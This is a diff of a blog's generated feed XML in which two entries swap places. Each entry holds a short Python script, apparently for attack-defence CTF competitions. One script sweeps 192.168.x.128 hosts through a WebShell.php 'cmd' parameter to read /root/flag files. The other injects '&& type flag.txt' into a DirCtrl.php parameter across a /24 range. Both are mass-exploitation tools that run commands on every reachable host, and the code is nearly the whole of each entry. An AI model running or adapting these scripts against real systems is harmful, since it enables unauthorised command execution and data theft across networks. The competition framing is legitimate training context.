@@ -520,11 +520,11 @@
     
     
     <entry>
-      <title>【PythonScript】:WebShell</title>
-      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/"/>
-      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/</url>
+      <title>【PythonScript】:WebShell_urilb</title>
+      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/"/>
+      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/</url>
       
-        <content type="html"><![CDATA[<p>&lt;&gt;</p><a id="more"></a><pre><code class="language-Python">import requestsimport threadingflag = open(&quot;webshellsave.txt&quot;,&quot;a&quot;)def run(i):    ip=&quot;192.168.&quot;+str(i)+&quot;.128&quot;    url=&quot;http://&quot;+ip+&quot;/WebShell.php/&quot;    payload={'cmd':'cat /root/flag*.txt'}    try:        r = requests.get(url,payload,timeout=1)        flag.write(r.url+&quot;\n&quot;+r.text)        print(&quot;GET FLAG! &gt;&gt;&quot;,r.url,'\n',r.text)    except:        print(&quot;\nConnect Fail &gt;&gt;&quot;,url)for i in range(101,254):    t = threading.Thread(target=run, args=(i,))    t.start()</code></pre><p><em><strong>转载请标明出处</strong></em></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p><strong>使用urlilb模块</strong></p><p><strong>在一些特定的攻防比赛中，攻击机没有安装requests模块，只能使用urlilb模块来代替</strong></p><a id="more"></a><pre><code class="language-Python">import urllib.parseimport urllib.requestimport threadingdef WebShell(i):    data = {&quot;dir&quot;: &quot;&amp;&amp; type flag.txt&quot;}    url = &quot;http://192.168.123.&quot;+str(i)+&quot;/DirCtrl.php&quot;    data_string=urllib.parse.urlencode(data)    new_url=url+&quot;?&quot;+data_string    try:        send = urllib.request.urlopen(new_url,timeout=1)        print(send.read().decode(&quot;utf8&quot;,&quot;ignore&quot;))    except:        passfor i in range(1,255):    t = threading.Thread(target=WebShell, args=(i, ))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
       
       
       <categories>
@@ -545,11 +545,11 @@
     
     
     <entry>
-      <title>【PythonScript】:WebShell_urilb</title>
-      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/"/>
-      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/</url>
+      <title>【PythonScript】:WebShell</title>
+      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/"/>
+      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/</url>
       
-        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p><strong>使用urlilb模块</strong></p><p><strong>在一些特定的攻防比赛中，攻击机没有安装requests模块，只能使用urlilb模块来代替</strong></p><a id="more"></a><pre><code class="language-Python">import urllib.parseimport urllib.requestimport threadingdef WebShell(i):    data = {&quot;dir&quot;: &quot;&amp;&amp; type flag.txt&quot;}    url = &quot;http://192.168.123.&quot;+str(i)+&quot;/DirCtrl.php&quot;    data_string=urllib.parse.urlencode(data)    new_url=url+&quot;?&quot;+data_string    try:        send = urllib.request.urlopen(new_url,timeout=1)        print(send.read().decode(&quot;utf8&quot;,&quot;ignore&quot;))    except:        passfor i in range(1,255):    t = threading.Thread(target=WebShell, args=(i, ))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
+        <content type="html"><![CDATA[<p>&lt;&gt;</p><a id="more"></a><pre><code class="language-Python">import requestsimport threadingflag = open(&quot;webshellsave.txt&quot;,&quot;a&quot;)def run(i):    ip=&quot;192.168.&quot;+str(i)+&quot;.128&quot;    url=&quot;http://&quot;+ip+&quot;/WebShell.php/&quot;    payload={'cmd':'cat /root/flag*.txt'}    try:        r = requests.get(url,payload,timeout=1)        flag.write(r.url+&quot;\n&quot;+r.text)        print(&quot;GET FLAG! &gt;&gt;&quot;,r.url,'\n',r.text)    except:        print(&quot;\nConnect Fail &gt;&gt;&quot;,url)for i in range(101,254):    t = threading.Thread(target=run, args=(i,))    t.start()</code></pre><p><em><strong>转载请标明出处</strong></em></p>]]></content>
       
       
       <categories>
